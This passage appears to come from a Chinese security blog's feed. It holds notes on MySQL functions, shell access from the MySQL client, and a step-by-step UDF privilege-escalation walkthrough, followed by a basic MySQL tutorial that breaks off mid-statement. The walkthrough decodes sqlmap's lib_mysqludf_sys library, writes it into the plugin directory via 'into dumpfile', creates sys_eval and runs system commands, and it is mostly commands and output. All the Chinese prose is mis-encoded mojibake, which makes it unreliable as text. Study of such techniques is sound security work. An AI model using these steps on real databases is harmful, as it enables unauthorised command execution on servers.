é”å‡½æ•°å’Œè§£é”å‡½æ•°</strong></p><ul><li>GET_LOCK(name,time)å‡½æ•°å®šä¹‰ä¸€ä¸ªåç§°ä¸ºnameã€æŒç»­æ—¶é—´é•¿åº¦ä¸ºtimeç§’çš„é”ã€‚å¦‚æœé”å®šæˆåŠŸï¼Œåˆ™è¿”å›1ï¼›å¦‚æœå°è¯•è¶…æ—¶ï¼Œåˆ™è¿”å›0ï¼›å¦‚æœé‡åˆ°é”™è¯¯ï¼Œè¿”å›NULLã€‚</li><li>RELEASE_LOCK(name)å‡½æ•°è§£é™¤åç§°ä¸ºnameçš„é”ã€‚å¦‚æœè§£é”æˆåŠŸï¼Œåˆ™è¿”å›1ï¼›å¦‚æœå°è¯•è¶…æ—¶ï¼Œè¿”å›0ï¼›å¦‚æœè§£é”å¤±è´¥ï¼Œè¿”å›NULLï¼›</li><li>IS_FREE_LOCK(name)å‡½æ•°åˆ¤æ–­æ˜¯å¦å·²ä½¿ç”¨åä¸ºnameçš„é”å®šã€‚å¦‚æœä½¿ç”¨ï¼Œè¿”å›0ï¼Œå¦åˆ™ï¼Œè¿”å›1ï¼›</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SELECT GET_LOCK(&#39;MySQL&#39;,10);</span><br><span class="line">+----------------------+</span><br><span class="line">| GET_LOCK(&#39;MySQL&#39;,10) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT IS_FREE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| IS_FREE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br><span class="line">SELECT RELEASE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RELEASE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>20.@@datadir</strong>                                       æ•°æ®åº“è·¯å¾„</p><p>â€‹      <strong>@@version_compile_os</strong>               æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p><p><strong>21.sleep(N)</strong></p><p>æ‰§è¡Œselect sleep(N)å¯ä»¥è®©æ­¤è¯­å¥è¿è¡ŒNç§’é’Ÿ</p><p>å‰ææ¡ä»¶: æŒ‡å®šæ¡ä»¶çš„è®°å½•å­˜åœ¨æ—¶æ‰ä¼šåœæ­¢æŒ‡å®šçš„ç§’æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(1),database(),version(),user();</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">| sleep(1) | database() | version()               | user()         |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">|        0 | test       | 8.0.22-0ubuntu0.20.04.2 | root@localhost |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">1 row in set (1.00 sec)</span><br></pre></td></tr></table></figure><h1 id="MySQL-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#MySQL-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="MySQL æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>MySQL æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h1><p>åœ¨ MySQL çš„å‘½ä»¤è¡Œç•Œé¢ä¸­å¯ä»¥ä½¿ç”¨ <code>system shell-cmd</code> æˆ–è€…<code>\! shell-cmd</code> æ ¼å¼æ‰§è¡Œ shell å‘½ä»¤ã€‚</p><p><strong>å®ä¾‹ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; system ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br><span class="line">mysql&gt; \! ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ‰“å¼€ä¸€ä¸ªæ–°çš„ shellï¼Œå…³é—­ shell (ä½¿ç”¨ exit æˆ–è€… CTRL D)åè¿”å› MySQL å‘½ä»¤è¡Œç•Œé¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; \! bash</span><br><span class="line">root@linux:&#x2F;var&#x2F;www&#x2F;html&#x2F;project# cd ~</span><br><span class="line">root@linux:~# ls</span><br><span class="line">snap</span><br><span class="line">root@linux:~# exit</span><br><span class="line">exit</span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><h1 id="UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h1><blockquote><p>UDF ä¸º â€œUser-Defined Functionâ€ çš„æ‰€å†™ï¼Œå³ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚MySQL å…è®¸ç”¨æˆ·æ·»åŠ æ–°çš„å‡½æ•°ï¼Œå…¶ä¸­ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡å…¶æä¾›çš„ UDF æ¥å£ï¼Œæ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å¯ä»¥ä½¿ç”¨ C/C++ è¯­è¨€ç¼–å†™å¹¶ç¼–è¯‘æˆåº“æ–‡ä»¶ï¼ˆå…¶å®ƒè¯­è¨€ä¹Ÿå¯ä»¥ï¼Œåªè¦èƒ½ç¼–è¯‘æˆå…±äº«åº“æ–‡ä»¶ï¼‰ï¼Œæ”¾åˆ° MySQL æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œä»¥ä¾¿ MySQL èƒ½åŠ¨æ€åŠ è½½ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ã€‚</p><p>ä½¿ç”¨ UDF å¯ä»¥åŠ è½½è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°æ‰§è¡Œå„ç§æ“ä½œï¼Œå…³äºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„ç¼–å†™å¯å‚è€ƒï¼Œ<a href="https://docstore.mik.ua/orelly/weblinux2/mysql/ch14_01.htm">Extending MySQL</a></p></blockquote><h2 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h2><p><strong>1ï¼‰åŸç†</strong>ï¼šUDFææƒæ˜¯åˆ©ç”¨MySQLçš„è‡ªå®šä¹‰å‡½æ•°åŠŸèƒ½ï¼Œæ„é€ ç‰¹å®šçš„DLLå°†Mysqlè´¦å·è½¬åŒ–ä¸ºç³»ç»Ÿsystemæƒé™</p><p><strong>2ï¼‰æ¡ä»¶</strong></p><ul><li>MySQL ç”¨æˆ·èƒ½å†™æ–‡ä»¶åˆ° MySQL æŒ‡å®šçš„è‡ªå®šä¹‰å‡½æ•°åº“å­˜æ”¾ç›®å½•ã€‚</li><li>MySQL ç”¨æˆ·å…·æœ‰ <code>INSERT</code> æƒé™ï¼Œæ‰èƒ½ä½¿ç”¨ <code>CREATE FUNCTION</code>è¯­å¥åœ¨ MySQL ä¸­æ·»åŠ è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œæ­¤å¤–å¦‚æœä½¿ç”¨ <code>DROP FUNCTION</code> è¯­å¥åˆ é™¤è‡ªå®šä¹‰å‡½æ•°ï¼Œè¿˜éœ€è¦æœ‰ <code>DELETE</code> æƒé™ã€‚</li></ul><p>æŸ¥çœ‹<code>secure_file_priv</code>çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br><span class="line">å½“secure_file_privçš„å€¼ä¸ºNULLæˆ–&#x2F;tmp&#x2F;æ—¶ï¼Œæ­¤æ—¶æ— æ³•ææƒ</span><br><span class="line">å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œåˆ™å¯ä»¥ææƒ</span><br></pre></td></tr></table></figure><h2 id="udfæ–‡ä»¶"><a href="#udfæ–‡ä»¶" class="headerlink" title="udfæ–‡ä»¶"></a>udfæ–‡ä»¶</h2><p>å¯¹äºudfæ–‡ä»¶ï¼Œåœ¨sqlmapå·¥å…·ä¸­è‡ªå¸¦å°±æœ‰ï¼Œæˆ–<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">github</a>é‡Œæœç´¢ï¼Œåªè¦æ‰¾å¯¹åº”æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å³å¯</p><p>æŸ¥çœ‹ç³»ç»Ÿæ¶æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;         æŸ¥çœ‹ä¸»æœºç‰ˆæœ¬åŠæ¶æ„</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173019139.png" alt="image-20201125173019139"></p><p>Windowsä¸‹æ˜¯.dllæ–‡ä»¶ï¼›linuxä¸‹æ˜¯.soæ–‡ä»¶</p><p>åœ¨ sqlmap\data\udf\mysql\windows|linux\64|32ç›®å½•ä¸‹å­˜æ”¾ç€lib_mysqludf_sys.dll__|.so_</p><p>ä½†æ˜¯sqlmap ä¸­ è‡ªå¸¦ çš„shell ä»¥åŠä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸ºäº†é˜²æ­¢è¢«è¯¯æ€éƒ½ç»è¿‡å¼‚æˆ–æ–¹å¼ç¼–ç ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨,å¯ä»¥åˆ©ç”¨sqlmap è‡ªå¸¦çš„è§£ç å·¥å…·cloak.pyè§£ç åï¼Œå†ç›´æ¥åˆ©ç”¨ã€‚</p><p>è¿›å…¥åˆ° sqlmap\extra\cloak ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python clock.py -d -i &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>ç„¶åä¼šç”Ÿæˆä¸€ä¸ªlib_mysqludf_sys.soæ–‡ä»¶</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173442662.png" alt="image-20201125173442662"></p><h2 id="ä½¿ç”¨udf"><a href="#ä½¿ç”¨udf" class="headerlink" title="ä½¿ç”¨udf"></a>ä½¿ç”¨udf</h2><p><strong>1)å°†udfæ–‡ä»¶æ”¾åˆ°æŒ‡å®šä½ç½®</strong></p><p>å¾—åˆ°æ’ä»¶åº“è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125180437269.png" alt="image-20201125180437269"></p><p>å¾—åˆ°udfæ–‡ä»¶çš„åå…­è¿›åˆ¶æ ¼å¼ï¼Œå¯åœ¨æœ¬åœ°é€šè¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so&#39;)) into outfile &#39;&#x2F;tmp&#x2F;udf.txt&#39;;</span><br></pre></td></tr></table></figure><p>#windowsä¸‹cmdå‘½ä»¤è¡Œå¤„ç†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -encodehex -f -v lib_mysqludf_sys.dll 1.txt 4</span><br></pre></td></tr></table></figure><p>å†™å…¥æ’ä»¶åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;7F454C46020...&#39; into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so&#39;;</span><br></pre></td></tr></table></figure><p><strong>2)ä»udfæ–‡ä»¶ä¸­å¼•å…¥è‡ªå®šä¹‰å‡½æ•°</strong></p><p>æŸ¥çœ‹ä¸‹è¿™ä¸ªudfåº“æ‰€æ”¯æŒçš„å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@linux:~# nm -D &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so</span><br><span class="line">         w _Jv_RegisterClasses</span><br><span class="line">0000000000201788 A __bss_start</span><br><span class="line">         w __cxa_finalize</span><br><span class="line">         w __gmon_start__</span><br><span class="line">0000000000201788 A _edata</span><br><span class="line">0000000000201798 A _end</span><br><span class="line">0000000000001178 T _fini</span><br><span class="line">0000000000000ba0 T _init</span><br><span class="line">         U fgets</span><br><span class="line">         U fork</span><br><span class="line">         U free</span><br><span class="line">         U getenv</span><br><span class="line">000000000000101a T lib_mysqludf_sys_info</span><br><span class="line">0000000000000da4 T lib_mysqludf_sys_info_deinit</span><br><span class="line">0000000000001047 T lib_mysqludf_sys_info_init</span><br><span class="line">         U malloc</span><br><span class="line">         U mmap</span><br><span class="line">         U pclose</span><br><span class="line">         U popen</span><br><span class="line">         U realloc</span><br><span class="line">         U setenv</span><br><span class="line">         U strcpy</span><br><span class="line">         U strncpy</span><br><span class="line">0000000000000dac T sys_bineval</span><br><span class="line">0000000000000dab T sys_bineval_deinit</span><br><span class="line">0000000000000da8 T sys_bineval_init</span><br><span class="line">0000000000000e46 T sys_eval</span><br><span class="line">0000000000000da7 T sys_eval_deinit</span><br><span class="line">0000000000000f2e T sys_eval_init</span><br><span class="line">0000000000001066 T sys_exec</span><br><span class="line">0000000000000da6 T sys_exec_deinit</span><br><span class="line">0000000000000f57 T sys_exec_init</span><br><span class="line">00000000000010f7 T sys_get</span><br><span class="line">0000000000000da5 T sys_get_deinit</span><br><span class="line">0000000000000fea T sys_get_init</span><br><span class="line">000000000000107a T sys_set</span><br><span class="line">00000000000010e8 T sys_set_deinit</span><br><span class="line">0000000000000f80 T sys_set_init</span><br><span class="line">         U sysconf</span><br><span class="line">         U system</span><br><span class="line">         U waitpid</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ›å»ºå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname &quot;lib_mysqludf_sys.so&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.14 sec)</span><br></pre></td></tr></table></figure><p><strong>3)æ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_eval(&#39;whoami&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| sys_eval(&#39;whoami&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| name   | ret | dl     | type   |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| sys_eval |  0 | lib_mysqludf_sys.so | function |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; drop function sys_eval;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from func;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/hellokandy/article/details/82964077">MySQL å¸¸ç”¨å†…ç½®å‡½æ•°ä¸æ‰€æœ‰å†…ç½®å‡½æ•°</a></p><p>[2] <a href="https://blog.csdn.net/qq_34845394/article/details/90077070">MySQLå¸¸ç”¨å†…ç½®å‡½æ•°</a></p><p>[3] <a href="https://www.cnblogs.com/litlife/p/9030673.html">udfææƒåŸç†è¯¦è§£</a></p><p>[4] <a href="https://www.jb51.net/article/51767.htm">Linuxåˆ©ç”¨UDFåº“å®ç°Mysqlææƒ</a></p><p>[5] <a href="https://blog.csdn.net/qq_36119192/article/details/84863268?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-2&spm=1001.2101.3001.4242">MySQL UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</a></p><p>[6] <a href="https://blog.csdn.net/Zlirving_/article/details/106423442?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control">Mysqlâ€”â€”udfææƒ</a></p><p>[7] <a href="https://bingslient.github.io/2019/10/31/MySQL%20%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8">MySQL å‡½æ•°åŠå…¶åˆ©ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLåŸºç¡€æ“ä½œå­¦ä¹ </title>
      <link href="posts/8774.html"/>
      <url>posts/8774.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>è®¤è¯†æ•°æ®åº“</p><ul><li>æ•°æ®åº“ : ç”¨æ¥å­˜å‚¨æµ·é‡æ•°æ®çš„ä»“åº“ ã€‚</li><li>SQL ï¼šç”¨äºè®¿é—®å’Œå¤„ç†æ•°æ®åº“çš„è®¡ç®—æœºè¯­è¨€ã€‚</li></ul><p>åˆ†ç±»ï¼š</p><ul><li>å…³ç³»å‹æ•°æ®åº“ï¼ˆäºŒç»´è¡¨æ ¼å½¢å¼ï¼‰ï¼šOracle,MySQL,MariaDB,SQL Serverâ€¦</li><li>éå…³ç³»å‹æ•°æ®åº“ï¼ˆnot only sqlï¼‰: Memcached,redis,MongoDBâ€¦</li></ul></blockquote><h1 id="MySQLåŸºç¡€æ“ä½œ"><a href="#MySQLåŸºç¡€æ“ä½œ" class="headerlink" title="MySQLåŸºç¡€æ“ä½œ"></a>MySQLåŸºç¡€æ“ä½œ</h1><p>å®‰è£…mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure><p>ç™»å½•mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/zXqlJhGSIiWtvbD.png" alt="image-20201109225823132"></p><p>é€€å‡ºmysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\q </span><br></pre></td></tr></table></figure><p>å½“å‰ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USER();</span><br></pre></td></tr></table></figure><p>å½“å‰æ—¥æœŸæ—¶é—´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT NOW();</span><br></pre></td></tr></table></figure><p>å½“å‰ç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION();</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨çŠ¶æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW STATUS;</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨é…ç½®å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES;</span><br></pre></td></tr></table></figure><h2 id="ç”¨æˆ·ç›¸å…³å‘½ä»¤"><a href="#ç”¨æˆ·ç›¸å…³å‘½ä»¤" class="headerlink" title="ç”¨æˆ·ç›¸å…³å‘½ä»¤"></a>ç”¨æˆ·ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰åˆ›å»ºç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;name&#39;@&#39;host&#39; identified by &#39;password&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sWatwF4vhOJYTNA.png" alt="image-20201112171427748"></p><p>ï¼ˆ2ï¼‰åˆ é™¤ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop user name@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/oe5ZK9Fv1qEkCAQ.png" alt="image-20201112171814162"></p><p>ï¼ˆ3ï¼‰ä¸ºç”¨æˆ·æˆæƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant some_privileges on *.* to &#39;name&#39;@&#39;host&#39;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fy1be78PohEBaL5.png" alt="image-20201112172854469"></p><p>æŸ¥çœ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;wyw&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/D6eKVu1wSGP3IvT.png" alt="image-20201112173201025"></p><p>ï¼ˆ4ï¼‰æ’¤é”€ç”¨æˆ·æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke some_privileges to *.* from &#39;name&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qmYS8la1EuW27iB.png" alt="image-20201112174611837"></p><p>æŸ¥çœ‹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/9MGbYT5ym1ASae3.png" alt="image-20201112174719182"></p><h2 id="åº“ç›¸å…³å‘½ä»¤"><a href="#åº“ç›¸å…³å‘½ä»¤" class="headerlink" title="åº“ç›¸å…³å‘½ä»¤"></a>åº“ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><hr><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE db_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æŸ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰æ‰“å¼€æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE db_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰æŸ¥çœ‹å½“å‰æ‰€åœ¨æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br></pre></td></tr></table></figure><h2 id="è¡¨ç›¸å…³å‘½ä»¤"><a href="#è¡¨ç›¸å…³å‘½ä»¤" class="headerlink" title="è¡¨ç›¸å…³å‘½ä»¤"></a>è¡¨ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name(</span><br><span class="line">column_name data_type,</span><br><span class="line">......</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>// []ä¸­å†…å®¹å¯çœç•¥ã€‚</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user(</span><br><span class="line">uid INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">username VARCHAR(30) NOT NULL,</span><br><span class="line">pwd CHAR(32) NOT NULL,</span><br><span class="line">pic CHAR(40) NOT NULL DEFAULT &#39;a.jpg&#39;,</span><br><span class="line">money DECIMAL(8,2),</span><br><span class="line">content TEXT,</span><br><span class="line">sex ENUM(&#39;male&#39;,&#39;female&#39;,&#39;secret&#39;),</span><br><span class="line">age TINYINT UNSIGNED NOT NULL DEFAULT &#39;18&#39;</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE 